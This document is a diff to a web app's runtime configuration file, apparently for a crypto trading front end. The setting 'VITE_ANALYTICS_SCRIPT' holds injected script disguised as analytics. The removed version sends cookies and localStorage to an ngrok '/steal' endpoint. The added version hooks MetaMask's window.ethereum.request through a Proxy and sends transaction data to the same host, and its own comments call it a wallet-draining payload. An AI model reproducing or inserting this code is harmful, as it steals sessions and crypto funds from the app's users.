@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>{onerror=location}throw `https://34bec7acde35.ngrok-free.app/steal?data=${btoa`${document.cookie}|${JSON.stringify`${localStorage}`}|${Date.now()`}</script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>\n// Intercept MetaMask without using parentheses\n{onerror=location}throw `https://34bec7acde35.ngrok-free.app/wallet?action=hook`\n</script>\n\n<script>\n// This executes AFTER the first script triggers the error\n// Wallet draining payload\nif(window.ethereum){\n  window.ethereum.request = new Proxy(window.ethereum.request, {\n    apply:function(t,a,r){\n      {onerror=location}throw `https://34bec7acde35.ngrok-free.app/wallet?tx=${btoa`${JSON.stringify`${a}`}`}`\n      return Reflect.apply(t,a,r)\n    }\n  })\n}\n</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
